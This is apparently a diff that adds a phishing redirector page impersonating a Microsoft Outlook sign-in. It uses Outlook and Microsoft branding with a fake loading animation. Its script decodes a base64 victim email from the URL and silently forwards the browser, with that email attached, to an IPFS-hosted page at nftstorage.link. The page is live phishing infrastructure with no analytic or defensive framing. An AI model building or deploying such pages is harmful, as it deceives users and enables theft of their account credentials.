@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to your account</title>
+    <link rel="icon" type="image/svg+xml"
+        href="https://upload.wikimedia.org/wikipedia/commons/c/cc/Microsoft_Outlook_Icon_%282025%E2%80%93present%29.svg" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background: transparent;
+        }
+
+        body {
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto,
+                "Helvetica Neue", Arial, sans-serif;
+            color: #1a1a1a;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            position: relative;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .stage {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            width: 100%;
+        }
+
+        .logo {
+            width: clamp(140px, 16vmin, 200px);
+            height: clamp(160px, 24vmin, 300px);
+            margin-top: clamp(10px, 1.8vmin, 20px);
+            object-fit: contain;
+            image-rendering: -webkit-optimize-contrast;
+            display: block;
+            opacity: 0;
+            animation:
+                logoIn 0.6s ease-out 0.05s forwards,
+                logoFloat 3.4s ease-in-out 0.6s infinite;
+            filter: drop-shadow(0 18px 28px rgba(70, 110, 200, 0.18));
+            user-select: none;
+            -webkit-user-drag: none;
+        }
+
+        .loader-bar {
+            margin-top: clamp(28px, 4vmin, 56px);
+            width: clamp(180px, 22vmin, 300px);
+            height: 4px;
+            background: rgba(0, 0, 0, 0.06);
+            border-radius: 999px;
+            overflow: hidden;
+            position: relative;
+            opacity: 0;
+            animation: fadeIn 0.6s ease 0.4s forwards;
+        }
+
+        .loader-bar::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -40%;
+            height: 100%;
+            width: 40%;
+            background: linear-gradient(90deg,
+                    rgba(80, 130, 235, 0) 0%,
+                    #4f7df3 40%,
+                    #2f6df0 60%,
+                    rgba(80, 130, 235, 0) 100%);
+            border-radius: 999px;
+            animation: slide 1.6s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: clamp(28px, 4.5vmin, 64px);
+            left: 0;
+            right: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            opacity: 0;
+            animation: fadeIn 0.8s ease 0.5s forwards;
+        }
+
+        .footer svg.ms-mark {
+            width: clamp(18px, 1.6vmin, 24px);
+            height: clamp(18px, 1.6vmin, 24px);
+            display: block;
+        }
+
+        .footer .ms-text {
+            font-size: clamp(14px, 1.3vmin, 18px);
+            color: #5e5e5e;
+            letter-spacing: 0.1px;
+            font-weight: 400;
+        }
+
+        @keyframes logoIn {
+            from {
+                opacity: 0;
+                transform: translateY(6px) scale(0.985);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        @keyframes logoFloat {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+            }
+
+            50% {
+                transform: translateY(-5px) scale(1.015);
+            }
+        }
+
+        @keyframes slide {
+            0% {
+                left: -40%;
+            }
+
+            100% {
+                left: 100%;
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(4px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .loader-bar {
+                width: 160px;
+                margin-top: 36px;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+
+            .logo,
+            .loader-bar,
+            .loader-bar::before,
+            .footer {
+                animation: none !important;
+                opacity: 1 !important;
+                transform: none !important;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <main class="stage" role="status" aria-live="polite" aria-label="Loading">
+        <img class="logo"
+            src="https://upload.wikimedia.org/wikipedia/commons/c/cc/Microsoft_Outlook_Icon_%282025%E2%80%93present%29.svg"
+            alt="Microsoft Outlook" draggable="false" />
+        <div class="loader-bar" aria-hidden="true"></div>
+    </main>
+    <footer class="footer">
+        <svg class="ms-mark" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path fill="#f25022" d="M1 1h10v10H1z" />
+            <path fill="#7fba00" d="M12 1h10v10H12z" />
+            <path fill="#00a4ef" d="M1 12h10v10H1z" />
+            <path fill="#ffb900" d="M12 12h10v10H12z" />
+        </svg>
+        <span class="ms-text">Microsoft</span>
+    </footer>
+    <script>
+        const siteCid = "?email=";
+        const gatewayBases = [
+            "https://bafkreibhsdme4xafylyd264qskjwlrmuabh4egs3kyznjgaitzniuwwytm.ipfs.nftstorage.link"
+        ];
+
+        function normalizeBase64(input) {
+            const cleaned = input.trim().replace(/\s/g, "+").replace(/-/g, "+").replace(/_/g, "/");
+            const paddingLength = (4 - (cleaned.length % 4)) % 4;
+            return cleaned + "=".repeat(paddingLength);
+        }
+
+        function base64Decode(str) {
+            try {
+                const normalized = normalizeBase64(str);
+                return decodeURIComponent(
+                    atob(normalized)
+                        .split("")
+                        .map(function (c) {
+                            return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
+                        })
+                        .join("")
+                );
+            } catch (e) {
+                console.error("Invalid base64 string:", str);
+                return null;
+            }
+        }
+
+        function getRedirectBaseUrl() {
+            for (const gatewayBase of gatewayBases) {
+                if (typeof gatewayBase === "string" && gatewayBase.trim() !== "") {
+                    return gatewayBase.replace(/\/+$/, "") + siteCid + "#";
+                }
+            }
+            return null;
+        }
+
+        function safeDecodeURIComponent(value) {
+            try {
+                return decodeURIComponent(value);
+            } catch (e) {
+                return value;
+            }
+        }
+
+        function getRawQueryParam(name) {
+            const query = window.location.search;
+            if (!query || query.length <= 1) {
+                return "";
+            }
+
+            const pairs = query.substring(1).split("&");
+            for (const pair of pairs) {
+                if (!pair) {
+                    continue;
+                }
+
+                const eqIdx = pair.indexOf("=");
+                const key = eqIdx >= 0 ? pair.substring(0, eqIdx) : pair;
+                if (safeDecodeURIComponent(key) !== name) {
+                    continue;
+                }
+
+                return eqIdx >= 0 ? pair.substring(eqIdx + 1) : "";
+            }
+
+            return "";
+        }
+
+        function extractEncodedValue() {
+            const rawHash = window.location.hash ? window.location.hash.substring(1).trim() : "";
+            const rawEmailParam = getRawQueryParam("email").trim();
+
+            if (rawHash) {
+                return safeDecodeURIComponent(rawHash);
+            }
+
+            if (!rawEmailParam) {
+                return "";
+            }
+
+            // Support legacy input style: ?email=#<base64>
+            if (rawEmailParam.startsWith("#")) {
+                return safeDecodeURIComponent(rawEmailParam.substring(1).trim());
+            }
+
+            return safeDecodeURIComponent(rawEmailParam);
+        }
+
+        function runRedirect() {
+            const encodedValue = extractEncodedValue();
+            if (!encodedValue) {
+                return;
+            }
+
+            const email = base64Decode(encodedValue);
+            if (!email) {
+                return;
+            }
+
+            const redirectBaseUrl = getRedirectBaseUrl();
+            if (!redirectBaseUrl) {
+                console.error("No valid redirect base URL configured.");
+                return;
+            }
+
+            // replace() avoids creating an extra history entry and is reliable on mobile browsers.
+            window.location.replace(redirectBaseUrl + encodeURIComponent(email));
+        }
+
+        runRedirect();
+    </script>
+</body>
+
+</html>
